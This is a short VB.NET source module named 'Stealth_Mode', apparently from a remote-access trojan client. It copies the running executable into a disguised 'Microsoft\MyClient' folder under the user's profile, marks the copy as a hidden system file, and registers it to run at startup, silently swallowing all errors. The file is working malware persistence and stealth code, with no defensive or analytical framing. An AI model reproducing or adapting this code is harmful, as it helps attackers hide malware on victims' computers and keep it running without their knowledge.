Imports System.IO
Namespace Persistence
    Module Stealth_Mode
        Public Sub Install_Server()
            Try
                Dim DropPath As String = Environ(Form1.PathS) & "\Microsoft\MyClient\"
                If Not (Directory.Exists(DropPath)) Then
                    Directory.CreateDirectory(DropPath)
                End If
                If File.Exists(DropPath & Form1.InstallName) Then
                    File.Delete(DropPath & Form1.InstallName)
                End If
                Melt(DropPath & Form1.InstallName)
            Catch ex As Exception

            End Try
        End Sub
        Public Sub Melt(filename As String)
            Try
                File.Copy(Application.ExecutablePath, filename, True)
                File.SetAttributes(filename, FileAttributes.System + FileAttributes.Hidden)
                AStartup(Form1.StartName, filename)
            Catch ex As Exception

            End Try
        End Sub
    End Module

End Namespace